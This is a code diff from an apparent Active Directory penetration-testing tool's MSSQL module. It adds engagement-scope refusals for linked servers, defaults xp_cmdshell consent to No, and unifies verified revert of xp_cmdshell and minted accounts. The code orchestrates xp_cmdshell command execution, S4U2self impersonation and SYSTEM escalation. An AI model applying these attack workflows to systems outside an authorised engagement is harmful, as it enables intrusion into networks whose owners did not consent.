@@ -6,6 +6,11 @@ of the giant `adscan.py`, while delegating execution logic to the service layer.
 
 from __future__ import annotations
 
+from adscan_core.reporting.engagement_scope import NOT_EXECUTED_OUTSIDE_SCOPE
+from adscan_core.scan_policy import settings as policy_settings
+
+from adscan_internal.services.ledger_guard import ledger_or_warn
+
 from collections.abc import Callable
 from dataclasses import asdict, dataclass, replace
 from datetime import datetime, timezone
@@ -37,7 +42,6 @@ from adscan_internal.integrations.mssql import queries as mssql_queries
 from adscan_internal.cli.common import build_lab_event_fields
 from adscan_internal.interaction import is_non_interactive
 from adscan_internal.rich_output import mark_sensitive
-from adscan_internal.services.cleanup_taxonomy import MANUAL_REASON_REVERT_FAILED
 from adscan_internal.services.environment_change_ledger import (
     CHANGE_CLASS_AUTO_REVERT,
 )
@@ -119,15 +123,6 @@ class MssqlShell(Protocol):
     domains_data: dict
     domains_dir: str
     current_workspace_dir: str | None
-
-    def _run_netexec(
-        self,
-        command: str,
-        *,
-        domain: str | None = None,
-        timeout: int | None = None,
-        **kwargs,
-    ) -> subprocess.CompletedProcess[str] | None: ...
 
     def _get_lab_slug(self) -> str | None: ...
 
@@ -544,8 +539,8 @@ def _get_workspace_dir(shell: MssqlShell) -> str:
 
 
 def _is_ctf_domain_pwned(shell: MssqlShell, domain: str) -> bool:
-    """Return whether the current CTF domain is already marked as pwned."""
-    if str(getattr(shell, "type", "") or "").strip().lower() != "ctf":
+    """Return whether the policy aims at domain compromise and the domain is pwned."""
+    if not policy_settings.aims_at_domain_compromise(shell):
         return False
     domains_data = getattr(shell, "domains_data", None)
     if not isinstance(domains_data, dict):
@@ -603,7 +598,7 @@ def _fetch_mssql_phase_files(
     result = WindowsArtifactAcquisitionService().acquire_files(
         file_targets=file_targets,
         download_dir=loot_dir,
-        workspace_type=str(getattr(shell, "type", "") or "").strip().lower() or None,
+        environment=policy_settings.policy_environment(shell),
         file_fetcher=lambda remote_path, save_path: _download_mssql_target(
             remote_executor=remote_executor,
             auth=auth,
@@ -781,8 +776,6 @@ def _run_mssql_filesystem_mapping(
         try_use_mapping_cache,
     )
 
-    workspace_type_mssql = str(getattr(shell, "type", "") or "").strip().lower()
-
     def _mssql_loader() -> "tuple[int, dict] | None":
         data = mapping_service.load_file_map(input_path=output_path)
         entries = list(data.get("entries") or [])
@@ -793,7 +786,6 @@ def _run_mssql_filesystem_mapping(
     mapping_result: dict[str, object] | None = try_use_mapping_cache(
         shell,
         manifest_path=output_path,
-        workspace_type=workspace_type_mssql,
         transport_label="MSSQL",
         loader=_mssql_loader,
     )
@@ -917,13 +909,11 @@ def _run_mssql_filesystem_mapping(
             write_loot_cache_metadata,
         )
 
-        workspace_type = str(getattr(shell, "type", "") or "").strip().lower()
         if decide_loot_cache_reuse(
             shell,
             loot_dir=loot_dir,
             meta_path=loot_meta_path,
             phase_label=phase_label,
-            workspace_type=workspace_type,
             transport_label="MSSQL",
         ):
             phase_fetcher = make_cached_loot_fetcher(loot_dir)
@@ -1326,8 +1316,7 @@ def _run_mssql_low_privilege_file_review(
                 return WindowsArtifactAcquisitionService().acquire_files(
                     file_targets=file_targets,
                     download_dir=loot_dir,
-                    workspace_type=str(getattr(shell, "type", "") or "").strip().lower()
-                    or None,
+                    environment=policy_settings.policy_environment(shell),
                     file_fetcher=_low_priv_file_fetcher,
                 )
 
@@ -1462,7 +1451,7 @@ def check_pivot_reachability_via_mssql(
             :func:`adscan_internal.services.pivot_service.is_pivoting_enabled`)
             pass ``True`` since the operator already opted into this class of
             action at scan-config level. ``None`` (the default) preserves
-            today's ``shell.type == "ctf"`` heuristic unchanged for the manual
+            the scan policy's ``scope_expansion`` setting for the manual
             interactive command.
     """
     from adscan_internal.cli.winrm import _load_workspace_network_reachability_report
@@ -1635,7 +1624,7 @@ def check_pivot_reachability_via_mssql(
         default_confirm = (
             consent_default_override
             if consent_default_override is not None
-            else str(getattr(shell, "type", "") or "").strip().lower() == "ctf"
+            else policy_settings.expands_scope_automatically(shell)
         )
         pivot_probe_prompt = (
             f"Do you want to probe {len(selected_targets)} likely pivot target(s) from "
@@ -2209,17 +2198,18 @@ def _try_mssql_s4u2self_as_da(
         return None
     kdc_fqdn = resolve_dc_fqdn(domain_record, target_domain=domain)
 
-    # --- Premium offer + gating (ctf: default Yes, audit: prompt, CI: safe default) ---
+    # --- Premium offer + gating: the policy's objective sets the default ---
+    # (domain compromise: Yes; full assessment: asks, and an unattended run
+    # declines the impersonation).
     _render_s4u2self_offer_panel(
         domain=domain, host=host, service_account=service_account_username
     )
-    is_ctf = str(getattr(shell, "type", "") or "").strip().lower() == "ctf"
-    default_yes = is_ctf
+    default_yes = policy_settings.aims_at_domain_compromise(shell)
     if is_non_interactive(shell):
         proceed = default_yes
         print_info_debug(
             f"[mssql][s4u2self] Non-interactive; auto-resolving offer to "
-            f"{'Yes' if proceed else 'No'} (ctf={is_ctf})."
+            f"{'Yes' if proceed else 'No'} (domain_compromise_objective={default_yes})."
         )
     else:
         proceed = confirm_ask(
@@ -2434,7 +2424,7 @@ def _get_env_change_ledger(shell: MssqlShell) -> Any:
     (:func:`run_mssql_takeover_da_workflow`) so both xp_cmdshell registration and
     revert resolve the ledger the same way.
     """
-    return getattr(shell, "environment_change_ledger", None)
+    return ledger_or_warn(shell)
 
 
 def _consent_enable_xp_cmdshell(
@@ -2461,6 +2451,23 @@ def _consent_enable_xp_cmdshell(
         True to proceed with the enable, False to leave the configuration alone.
     """
     scope_label = "linked server" if is_linked else "host"
+    # Step-through attack-path run: approving the step approved the technique,
+    # not this configuration change, so the change gets its own approve-or-skip
+    # at the console (no answer = skip). Outside step mode the policy below holds.
+    from adscan_internal.services.attack_path_execution_run import (  # noqa: PLC0415
+        get_active_execution_run,
+    )
+
+    run = get_active_execution_run(shell)
+    if run is not None:
+        decision = run.confirm_environment_change(
+            f"Enable xp_cmdshell on {scope_label} {marked_target}? This changes the "
+            "SQL Server configuration so commands can run; ADscan records it and "
+            "reverts it at scan end.",
+            change_kind="mssql_xp_cmdshell_enabled",
+        )
+        if decision is not None:
+            return decision
     if is_non_interactive(shell):
         print_info_debug(
             "Non-interactive engagement — proceeding to enable xp_cmdshell on "
@@ -2471,49 +2478,8 @@ def _consent_enable_xp_cmdshell(
     return confirm_ask(
         f"Enable xp_cmdshell on {scope_label} {marked_target}? This modifies the "
         "SQL Server configuration; ADscan reverts it at scan end.",
-        default=True,
+        default=False,
     )
-
-
-def _route_xp_cmdshell_revert_failure(
-    ledger: Any,
-    change_id: str,
-    *,
-    host: str,
-    linked_server: str | None,
-    error: str,
-) -> None:
-    """Route a failed/unconfirmed xp_cmdshell revert to a manual-required state.
-
-    Records the client-safe native remediation command + the object the client
-    acts on, accounts the failed attempt under the bounded-retry budget, then
-    lands the record in the ONE legal-critical terminal state so the cleanup
-    report (PDF + web) shows a complete manual checklist rather than a
-    half-state.
-    """
-    if ledger is None or not change_id:
-        return
-    remediation_command = "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;"
-    remediation_object = (
-        f"{linked_server} (linked server via {host})" if linked_server else host
-    )
-    try:
-        ledger.set_revert_metadata(
-            change_id,
-            remediation_command=remediation_command,
-            remediation_object_dn=remediation_object,
-        )
-        ledger.mark_revert_retry(change_id, error=error)
-        ledger.mark_manual_required(
-            change_id,
-            reason=MANUAL_REASON_REVERT_FAILED,
-            remediation_command=remediation_command,
-            remediation_object_dn=remediation_object,
-            error=error,
-        )
-    except Exception as exc:  # noqa: BLE001 - ledger bookkeeping is best-effort
-        telemetry.capture_exception(exc)
-        print_exception(exception=exc)
 
 
 @dataclass
@@ -2539,6 +2505,58 @@ class _LinkedXpEnableOutcome:
     enabled: bool
     change_id: str | None
     declined: bool
+    outside_scope: bool = False
+
+
+def _refuse_linked_server_outside_scope(
+    shell: MssqlShell,
+    backend: ImpacketMSSQLBackend,
+    *,
+    domain: str,
+    linked_server: str,
+    username: str,
+    secret: str,
+    action: str,
+) -> bool:
+    """Keep an attack step from acting THROUGH a link whose host is out of scope.
+
+    A command sent ``AT [link]`` runs on the linked host, so the step acts on
+    that host's domain. Its host comes from this instance's ``sys.servers`` (a
+    local read) and is judged by the engagement-scope SSOT; a bare name or IP is
+    resolved through the instance's domain inventory, and a host whose domain
+    still cannot be determined is outside the scope. Returns True when the step was
+    refused (one operator line and a ``withheld`` record, nothing sent).
+    """
+    from adscan_internal.services.engagement_scope import (  # noqa: PLC0415
+        linked_server_target_verdict,
+        refuse_outside_scope,
+    )
+
+    try:
+        data_source = backend.linked_server_data_source(
+            linked_server, domain=domain, username=username, secret=secret
+        )
+    except Exception as exc:  # noqa: BLE001 - an unread data source is undetermined
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        data_source = ""
+    # ``domain`` is the domain of the instance holding the link: its computer
+    # inventory resolves a data source that is a bare name or an IP.
+    verdict = linked_server_target_verdict(
+        shell, data_source=data_source, collecting_domain=domain
+    )
+    if verdict.allowed:
+        return False
+    refuse_outside_scope(
+        shell,
+        relation=action,
+        out_domain=verdict.host_domain,
+        surface="mssql_linked_server",
+        path_domain=domain,
+        to_label=verdict.host or linked_server,
+        source_domain=domain,
+    )
+    return True
 
 
 def _ensure_xp_cmdshell_enabled_local(
@@ -2721,6 +2739,18 @@ def _ensure_xp_cmdshell_enabled_linked(
         was confirmed (the caller then tracks ``change_id`` for revert).
     """
     marked_link = mark_sensitive(linked_server, "hostname")
+    if _refuse_linked_server_outside_scope(
+        shell,
+        backend,
+        domain=domain,
+        linked_server=linked_server,
+        username=username,
+        secret=secret,
+        action="xp_cmdshell through a linked server",
+    ):
+        return _LinkedXpEnableOutcome(
+            enabled=False, change_id=None, declined=False, outside_scope=True
+        )
     if not _consent_enable_xp_cmdshell(shell, marked_target=marked_link, is_linked=True):
         print_info(
             f"Operator declined enabling xp_cmdshell on linked server "
@@ -2808,6 +2838,57 @@ class XpCmdshellExecResult:
     linked_server: str | None = None
 
 
+def _xp_cmdshell_revert_and_confirm(
+    backend: ImpacketMSSQLBackend,
+    candidate: Any,
+    *,
+    linked_server: str | None,
+    original_advanced_on: bool,
+) -> tuple[bool, str | None]:
+    """Disable the ``xp_cmdshell`` ADscan enabled, as ``candidate``, then re-read it.
+
+    The SQL transport of the shared revert precedence. Local: restore the
+    pre-enable advanced-options state and re-read ``sys.configurations``.
+    Linked: disable over the link (``EXEC ... AT``) and re-read the remote
+    ``sys.configurations`` through the same link. ``(True, None)`` only when the
+    re-read shows ``xp_cmdshell`` off; an unreadable state never confirms.
+    """
+    from adscan_internal.integrations.mssql import parsers as mssql_parsers  # noqa: PLC0415
+
+    creds = {
+        "domain": candidate.domain,
+        "username": candidate.username,
+        "secret": candidate.secret,
+    }
+    if linked_server:
+        result = backend.execute_query(
+            query=mssql_queries.disable_xp_cmdshell_on_link(linked_server),
+            timeout=60,
+            **creds,
+        )
+        if not bool(getattr(result, "success", False)):
+            return False, str(getattr(result, "error", "") or "the disable over the link failed")
+        probe = backend.execute_query(
+            query=mssql_queries.xp_cmdshell_state_at_link(linked_server, via_rpc=True),
+            timeout=30,
+            **creds,
+        )
+        if not bool(getattr(probe, "success", False)):
+            return False, "the re-read over the link failed"
+        if mssql_parsers.parse_xp_cmdshell_state(list(probe.rows or [])) is False:
+            return True, None
+        return False, "the re-read over the link does not show xp_cmdshell disabled"
+    result = backend.disable_xp_cmdshell(
+        restore_advanced_options=original_advanced_on, timeout=60, **creds
+    )
+    if not bool(getattr(result, "success", False)):
+        return False, str(getattr(result, "error", "") or "the disable was refused")
+    post_state, _ = backend._read_xp_cmdshell_state(timeout=30, **creds)
+    if post_state == XpCmdshellStatus.DISABLED:
+        return True, None
+    return False, f"the re-read shows xp_cmdshell {post_state.value}"
+
+
 def _revert_xp_cmdshell_enable(
     shell: MssqlShell,
     backend: ImpacketMSSQLBackend,
@@ -2823,89 +2904,62 @@ def _revert_xp_cmdshell_enable(
     """Disable the ``xp_cmdshell`` WE enabled and drive its ledger record to a
     confirmed / manual-required terminal state. Returns True when confirmed.
 
-    Single per-change revert path shared by the ad-hoc post-auth workflow and the
-    reusable attack-step primitive, so an ``xp_cmdshell`` we turned on is always
-    turned back off — local: restore the pre-enable advanced-options state and
-    re-read to verify; linked: ``disable_xp_cmdshell_on_link`` over the link. A
-    failed / unconfirmed revert routes to ``manual_required`` so the client always
-    gets a cleanup checklist instead of a silently-modified server.
+    THE revert path for every ``xp_cmdshell`` ADscan enabled (the ad-hoc
+    post-auth workflow, its linked-server enables and the reusable attack-step
+    primitive), through the shared revert precedence: the client cleanup
+    account, a verified privileged credential, then the login that enabled it.
+    Each attempt is recorded and only a re-read showing the option off settles
+    ``reverted_confirmed``; otherwise the record is ``manual_required`` with the
+    native command, so the client always gets a cleanup checklist.
     """
+    from adscan_internal.services.revert_credentials import (  # noqa: PLC0415
+        KIND_CCACHE,
+        KIND_NT_HASH,
+        KIND_PASSWORD,
+        ROLE_CREATOR,
+        RevertCandidate,
+        run_revert_with_precedence,
+    )
+
     marked = mark_sensitive(linked_server or host, "hostname")
     ledger = _get_env_change_ledger(shell)
-    if ledger is not None and change_id:
-        try:
-            ledger.mark_revert_in_progress(change_id)
-        except Exception as exc:  # noqa: BLE001
-            telemetry.capture_exception(exc)
-            print_exception(exception=exc)
-
-    reverted = False
-    verified = False
-    verification = "xp_cmdshell_disable"
-    try:
-        if linked_server:
-            revert_result = backend.execute_query(
-                domain=domain,
-                username=username,
-                secret=password,
-                query=mssql_queries.disable_xp_cmdshell_on_link(linked_server),
-                timeout=60,
-            )
-            reverted = bool(getattr(revert_result, "success", False))
-            # A remote state re-read over the link is not cheap; a confirmed
-            # disable statement is the verification for the linked path.
-            verified = reverted
-            verification = "xp_cmdshell_disable_on_link"
-        else:
-            revert_result = backend.disable_xp_cmdshell(
-                domain=domain,
-                username=username,
-                secret=password,
-                restore_advanced_options=original_advanced_on,
-                timeout=60,
-            )
-            reverted = bool(getattr(revert_result, "success", False))
-            verification = "xp_cmdshell_state_reread"
-            if reverted:
-                try:
-                    post_state, _ = backend._read_xp_cmdshell_state(
-                        domain=domain, username=username, secret=password, timeout=30
-                    )
-                    verified = post_state != XpCmdshellStatus.ENABLED
-                except Exception as exc:  # noqa: BLE001 - verify re-read is best-effort
-                    telemetry.capture_exception(exc)
-                    print_exception(exception=exc)
-                    verified = False
-    except Exception as exc:  # noqa: BLE001 - revert is best-effort hygiene
-        telemetry.capture_exception(exc)
-        print_exception(exception=exc)
-        print_warning(f"xp_cmdshell revert raised on {marked}: {exc}.")
-        reverted = False
-
-    if reverted and verified:
-        print_info_debug(f"xp_cmdshell reverted to disabled on {marked}.")
-        if ledger is not None and change_id:
-            try:
-                ledger.mark_reverted_confirmed(
-                    change_id,
-                    verification_method=verification,
-                    min_credential_principal=username,
-                )
-            except Exception as exc:  # noqa: BLE001
-                telemetry.capture_exception(exc)
-                print_exception(exception=exc)
-        return True
-
-    print_warning(
-        f"xp_cmdshell revert was NOT confirmed on {marked} — verify the SQL "
-        "Server configuration manually."
+    secret_kind = _classify_minted_secret_kind(password)
+    # The login that enabled it, exactly as it authenticated (an empty domain is
+    # SQL authentication, which a Windows-auth candidate cannot stand in for).
+    creator = RevertCandidate(
+        role=ROLE_CREATOR,
+        username=username,
+        domain=domain,
+        secret=password,
+        kind={"ccache": KIND_CCACHE, "nt_hash": KIND_NT_HASH}.get(secret_kind, KIND_PASSWORD),
     )
-    _route_xp_cmdshell_revert_failure(
-        ledger,
-        change_id or "",
-        host=host,
-        linked_server=linked_server,
-        error="xp_cmdshell disable/verify not confirmed",
+    result = run_revert_with_precedence(
+        shell,
+        ledger=ledger if change_id else None,
+        change_id=change_id,
+        domain=domain or str(getattr(shell, "domain", "") or ""),
+        purpose="mssql_xp_cmdshell_enabled",
+        revert_and_confirm=lambda candidate: _xp_cmdshell_revert_and_confirm(
+            backend,
+            candidate,
+            linked_server=linked_server,
+            original_advanced_on=original_advanced_on,
+        ),
+        verification_method=(
+            "xp_cmdshell_state_reread_on_link" if linked_server else "xp_cmdshell_state_reread"
+        ),
+        manual_instructions="EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;",
+        object_dn=f"{linked_server} (linked server via {host})" if linked_server else host,
+        extra_before_creator=[creator],
+        supported_kinds=(KIND_PASSWORD, KIND_NT_HASH, KIND_CCACHE),
+        description="xp_cmdshell disable",
+    )
+    if result.confirmed:
+        print_info_debug(f"xp_cmdshell reverted to disabled on {marked}.")
+        return True
+    print_warning(
+        f"xp_cmdshell revert was NOT confirmed on {marked}. Verify the SQL "
+        "Server configuration manually."
     )
     return False
 
@@ -3037,6 +3091,27 @@ def execute_xp_cmdshell_on_instance(
         ntlm_fallback_secret=ntlm_fallback_secret,
     )
 
+    # A command sent AT [link] runs on the linked host: nothing is sent when
+    # that host is outside the engagement scope (engagement-scope SSOT).
+    if is_linked and _refuse_linked_server_outside_scope(
+        shell,
+        backend,
+        domain=domain,
+        linked_server=linked_server,  # type: ignore[arg-type]
+        username=username,
+        secret=password,
+        action="xp_cmdshell through a linked server",
+    ):
+        return XpCmdshellExecResult(
+            ok=False,
+            enabled_by_us=False,
+            already_enabled=False,
+            output="",
+            reason=NOT_EXECUTED_OUTSIDE_SCOPE,
+            execution_identity="",
+            linked_server=linked_server,
+        )
+
     # Observe the current xp_cmdshell state before touching anything.
     if is_linked:
         # A linked server's remote state cannot be read cheaply from here; treat
@@ -3071,6 +3146,16 @@ def execute_xp_cmdshell_on_instance(
             username=username,
             secret=password,
         )
+        if linked_outcome.outside_scope:
+            return XpCmdshellExecResult(
+                ok=False,
+                enabled_by_us=False,
+                already_enabled=already_enabled,
+                output="",
+                reason=NOT_EXECUTED_OUTSIDE_SCOPE,
+                execution_identity="",
+                linked_server=linked_server,
+            )
         if linked_outcome.declined:
             return XpCmdshellExecResult(
                 ok=False,
@@ -3547,6 +3632,17 @@ def run_openrowset_bulk_read_on_instance(
         ntlm_fallback_secret=ntlm_fallback_secret,
     )
 
+    if linked_server and _refuse_linked_server_outside_scope(
+        shell,
+        backend,
+        domain=domain,
+        linked_server=linked_server,
+        username=username,
+        secret=password,
+        action="OPENROWSET bulk read through a linked server",
+    ):
+        return OpenRowsetBulkReadResult(ok=False, reason=NOT_EXECUTED_OUTSIDE_SCOPE)
+
     # Live-confirm the capability — the graph fact may be stale, and a
     # below-sysadmin SQLAccess login's ADMINISTER BULK OPERATIONS grant can be
     # revoked between collection and execution.
@@ -3710,8 +3806,7 @@ def run_openrowset_bulk_read_on_instance(
             return WindowsArtifactAcquisitionService().acquire_files(
                 file_targets=file_targets,
                 download_dir=loot_dir,
-                workspace_type=str(getattr(shell, "type", "") or "").strip().lower()
-                or None,
+                environment=policy_settings.policy_environment(shell),
                 file_fetcher=_bulk_read_fetcher,
             )
 
@@ -4055,6 +4150,16 @@ def run_xpcmdshell_system_escalation_followup(
             kdc_host=kdc_host,
             ntlm_fallback_secret=ntlm_fallback_secret,
         )
+        if linked_server and _refuse_linked_server_outside_scope(
+            shell,
+            backend,
+            domain=domain,
+            linked_server=linked_server,
+            username=username,
+            secret=password,
+            action="SYSTEM escalation through a linked server",
+        ):
+            return
 
         # 4) Minted admin identity — create-new-vs-reuse-an-owned, routed through
         # the shared SSOT (adscan_internal/services/privileged_account_provisioning.py)
@@ -4142,17 +4247,21 @@ def run_xpcmdshell_system_escalation_followup(
             verification_domain=target_domain,
         )
         if not svc.can_exploit():
-            print_info_debug(
-                "MSSQL SYSTEM escalation follow-up: preconditions not met "
-                "(SeImpersonate/CLR unavailable); skipping."
+            print_warning(
+                "MSSQL SYSTEM escalation was skipped on "
+                f"{mark_sensitive(target_label, 'hostname')}: the preconditions "
+                "are not met on that host (SeImpersonate or CLR is unavailable), "
+                "so the chain stops here without reaching SYSTEM."
             )
             return
 
         session = svc.session()
         try:
             if not session.setup():
-                print_info_debug(
-                    "MSSQL SYSTEM escalation follow-up: CLR setup failed; skipping."
+                print_warning(
+                    "MSSQL SYSTEM escalation did not run on "
+                    f"{mark_sensitive(target_label, 'hostname')}: the CLR session "
+                    "setup failed, so the chain stops here without reaching SYSTEM."
                 )
                 return
             result = session.execute_admin_user(
@@ -4704,156 +4813,58 @@ def run_mssql_postauth_workflow(
     def _revert_local_xp_cmdshell() -> None:
         """Restore the LOCAL xp_cmdshell to its pre-engagement state if WE enabled it.
 
-        Drives the ledger record through the verify-the-undo flow: disable, then
-        a re-read confirms the option is actually off before the record reaches
-        the good terminal state. A failed/unconfirmed revert routes to
-        ``manual_required`` so the client always gets a checklist. Idempotent: a
-        no-op once reverted (``enabled_by_us`` cleared).
+        Delegates to :func:`_revert_xp_cmdshell_enable` (the shared revert
+        precedence with a confirming re-read). Idempotent: a no-op once reverted
+        (``enabled_by_us`` cleared).
         """
         nonlocal enabled_by_us, local_change_id
         if not enabled_by_us:
             return
-        ledger = _get_env_change_ledger(shell)
-        change_id = local_change_id
-        if ledger is not None and change_id:
-            try:
-                ledger.mark_revert_in_progress(change_id)
-            except Exception as exc:  # noqa: BLE001
-                telemetry.capture_exception(exc)
-                print_exception(exception=exc)
         print_info_debug(
             f"Reverting xp_cmdshell on {marked_host} to its pre-engagement state "
             "(ADscan enabled it; restoring the original configuration)."
         )
-        reverted = False
-        try:
-            revert_result = backend.disable_xp_cmdshell(
-                domain=domain,
-                username=username,
-                secret=password,
-                restore_advanced_options=original_advanced_on,
-                timeout=60,
-            )
-            reverted = bool(getattr(revert_result, "success", False))
-        except Exception as exc:  # noqa: BLE001 - revert is best-effort hygiene
-            telemetry.capture_exception(exc)
-            print_exception(exception=exc)
-            print_warning(f"xp_cmdshell revert raised on {marked_host}: {exc}.")
-            reverted = False
-
-        verified = False
-        if reverted:
-            try:
-                post_state, _ = backend._read_xp_cmdshell_state(
-                    domain=domain,
-                    username=username,
-                    secret=password,
-                    timeout=30,
-                )
-                verified = post_state != XpCmdshellStatus.ENABLED
-            except Exception as exc:  # noqa: BLE001 - verify re-read is best-effort
-                telemetry.capture_exception(exc)
-                print_exception(exception=exc)
-                verified = False
-
-        if reverted and verified:
-            print_info_debug(f"xp_cmdshell reverted to disabled on {marked_host}.")
-            if ledger is not None and change_id:
-                try:
-                    ledger.mark_reverted_confirmed(
-                        change_id,
-                        verification_method="xp_cmdshell_state_reread",
-                        min_credential_principal=username,
-                    )
-                except Exception as exc:  # noqa: BLE001
-                    telemetry.capture_exception(exc)
-                    print_exception(exception=exc)
-        else:
-            print_warning(
-                f"xp_cmdshell revert was NOT confirmed on {marked_host} — "
-                "verify the SQL Server configuration manually."
-            )
-            _route_xp_cmdshell_revert_failure(
-                ledger,
-                change_id or "",
-                host=host,
-                linked_server=None,
-                error="xp_cmdshell disable/verify not confirmed",
-            )
+        _revert_xp_cmdshell_enable(
+            shell,
+            backend,
+            domain=domain,
+            username=username,
+            password=password,
+            host=host,
+            linked_server=None,
+            change_id=local_change_id,
+            original_advanced_on=original_advanced_on,
+        )
         enabled_by_us = False
         local_change_id = None
 
     def _revert_linked_xp_cmdshell() -> None:
         """Disable xp_cmdshell on every linked server WE enabled it on.
 
-        Uses the previously-unused
-        :func:`queries.disable_xp_cmdshell_on_link` (``EXEC(...) AT [link]``)
-        via the backend's generic ``execute_query`` so the linked-server change
-        is no longer left ON after the engagement. Each ledger record is driven
-        to a confirmed / manual-required terminal state. Idempotent: drains the
+        Each link goes through :func:`_revert_xp_cmdshell_enable` (the shared
+        revert precedence, re-read over the link). Idempotent: drains the
         tracked list.
         """
         if not linked_enabled:
             return
-        ledger = _get_env_change_ledger(shell)
         pending = list(linked_enabled)
         linked_enabled.clear()
         for linked_name, change_id in pending:
-            marked_link = mark_sensitive(linked_name, "hostname")
-            if ledger is not None and change_id:
-                try:
-                    ledger.mark_revert_in_progress(change_id)
-                except Exception as exc:  # noqa: BLE001
-                    telemetry.capture_exception(exc)
-                    print_exception(exception=exc)
             print_info_debug(
-                f"Reverting linked-server xp_cmdshell on {marked_link} "
-                f"(enabled via {marked_host})."
+                f"Reverting linked-server xp_cmdshell on "
+                f"{mark_sensitive(linked_name, 'hostname')} (enabled via {marked_host})."
             )
-            reverted = False
-            try:
-                revert_result = backend.execute_query(
-                    domain=domain,
-                    username=username,
-                    secret=password,
-                    query=mssql_queries.disable_xp_cmdshell_on_link(linked_name),
-                    timeout=60,
-                )
-                reverted = bool(getattr(revert_result, "success", False))
-            except Exception as exc:  # noqa: BLE001 - revert is best-effort hygiene
-                telemetry.capture_exception(exc)
-                print_exception(exception=exc)
-                print_warning(
-                    f"Linked-server xp_cmdshell revert raised on {marked_link}: {exc}."
-                )
-                reverted = False
-
-            if reverted:
-                print_info_debug(
-                    f"Linked-server xp_cmdshell reverted to disabled on {marked_link}."
-                )
-                if ledger is not None and change_id:
-                    try:
-                        ledger.mark_reverted_confirmed(
-                            change_id,
-                            verification_method="xp_cmdshell_disable_on_link",
-                            min_credential_principal=username,
-                        )
-                    except Exception as exc:  # noqa: BLE001
-                        telemetry.capture_exception(exc)
-                        print_exception(exception=exc)
-            else:
-                print_warning(
-                    f"Linked-server xp_cmdshell revert was NOT confirmed on "
-                    f"{marked_link} — verify the SQL Server configuration manually."
-                )
-                _route_xp_cmdshell_revert_failure(
-                    ledger,
-                    change_id or "",
-                    host=host,
-                    linked_server=linked_name,
-                    error="linked-server xp_cmdshell disable not confirmed",
-                )
+            _revert_xp_cmdshell_enable(
+                shell,
+                backend,
+                domain=domain,
+                username=username,
+                password=password,
+                host=host,
+                linked_server=linked_name,
+                change_id=change_id,
+                original_advanced_on=False,
+            )
 
     def _revert_xp_cmdshell_if_we_enabled() -> None:
         """Single revert entry point for EVERY xp_cmdshell change we made.
@@ -5172,10 +5183,8 @@ def run_mssql_impersonate(
 
 
 def _classify_minted_secret_kind(secret: str) -> str:
-    """Classify a minted account secret for transport config builders.
+    """Classify a minted account secret (SSOT ``native_account_cleanup``).
 
-    Delegates to the SSOT ``native_account_cleanup.classify_secret_kind`` so the
-    minted-account LDAP-delete and remote-exec paths share one classifier.
     Returns one of ``"password"`` / ``"nt_hash"`` / ``"ccache"``.
     """
     from adscan_internal.services.native_account_cleanup import classify_secret_kind
@@ -5183,118 +5192,67 @@ def _classify_minted_secret_kind(secret: str) -> str:
     return classify_secret_kind(secret)
 
 
-def _delete_minted_account_via_ldap(
-    shell: MssqlShell,
-    *,
-    domain: str,
-    admin_username: str,
-    admin_password: str,
-) -> bool:
-    """Delete a freshly-minted DOMAIN account via native LDAP, as that account.
-
-    A brand-new Domain Admin has full LDAP rights but is NOT a SQL sysadmin
-    login, so it cannot run ``xp_cmdshell``. Thin wrapper over the SSOT
-    ``native_account_cleanup.delete_domain_account_via_ldap`` (the same helper the
-    HasSession del-user rollback uses): binds AS the minted account over the
-    canonical LDAPS->LDAP fallback transport, resolves the DN by sAMAccountName
-    and deletes it. Returns True only when the object is confirmed gone.
-    """
+def _domain_dc(shell: MssqlShell, domain: str) -> tuple[str, str]:
+    """``(dc_ip, dc_fqdn)`` for ``domain`` from the workspace (empty when unknown)."""
     from adscan_internal.services.native_account_cleanup import (  # noqa: PLC0415
-        delete_domain_account_via_ldap,
+        resolve_domain_dc,
     )
 
-    marked = mark_sensitive(admin_username, "user")
-    marked_domain = mark_sensitive(domain, "domain")
-
-    ok = delete_domain_account_via_ldap(
-        domains_data=getattr(shell, "domains_data", None) or {},
-        domain=domain,
-        username=admin_username,
-        secret=admin_password,
-    )
-    if not ok:
-        print_info_debug(
-            f"[mssql][revert] native LDAP delete of {marked} on {marked_domain} "
-            "did not confirm."
-        )
-    return ok
+    return resolve_domain_dc(shell, domain)
 
 
-def _delete_minted_account_via_remote_exec(
+def _delete_minted_account_as(
     shell: MssqlShell,
+    candidate: Any,
     *,
     domain: str,
     host: str,
     admin_username: str,
-    admin_password: str,
+    scope: str,
     kdc_ip: str | None = None,
-) -> bool:
-    """Delete a minted account by running ``net user /delete`` via remote-exec.
+) -> tuple[bool, str | None]:
+    """Delete the minted account as ``candidate``, then re-read it.
 
-    Uses the centralized native remote-execution cascade (SMBEXEC -> ATEXEC ->
-    ...) with the minted account's own credential (local Administrator on a
-    member server, or the Domain Admin used as a fallback on a DC). Returns True
-    only when the command output confirms completion.
+    Thin delegate to the shared account-deletion transport
+    (:func:`native_account_cleanup.delete_minted_account_as`). Never
+    ``xp_cmdshell``: a freshly-minted Domain Admin is not a SQL sysadmin.
     """
-    from adscan_internal.models.domain import resolve_dc_fqdn  # noqa: PLC0415
-    from adscan_internal.services.async_bridge import run_async_sync  # noqa: PLC0415
-    from adscan_internal.services.remote_exec import (  # noqa: PLC0415
-        build_smb_config_from_credential,
-        execute_with_fallback,
+    from adscan_internal.services.native_account_cleanup import (  # noqa: PLC0415
+        delete_minted_account_as,
     )
 
-    marked = mark_sensitive(admin_username, "user")
-    marked_host = mark_sensitive(host, "hostname")
-    secret_kind = _classify_minted_secret_kind(admin_password)
+    return delete_minted_account_as(
+        getattr(shell, "domains_data", None) or {},
+        candidate,
+        domain=domain,
+        host=host,
+        username=admin_username,
+        scope=scope,
+        kdc_ip=kdc_ip,
+    )
 
-    domain_record = (getattr(shell, "domains_data", None) or {}).get(domain) or {}
-    # For a ccache/Kerberos credential the SPN host must be an FQDN; otherwise
-    # the provided host (IP or name) is used directly for the SMB connection.
-    target_host = (
-        resolve_dc_fqdn(domain_record, target_domain=domain)
-        if secret_kind == "ccache"
-        else host
-    ) or host
 
-    try:
-        config = build_smb_config_from_credential(
-            domain=domain,
-            username=admin_username,
-            secret=admin_password,
-            secret_kind=secret_kind,  # type: ignore[arg-type]
-            target_host=target_host,
-            target_ip=host,
-            kdc_ip=kdc_ip,
-        )
-    except ValueError as exc:
-        telemetry.capture_exception(exc)
-        print_exception(exception=exc)
-        print_info_debug(
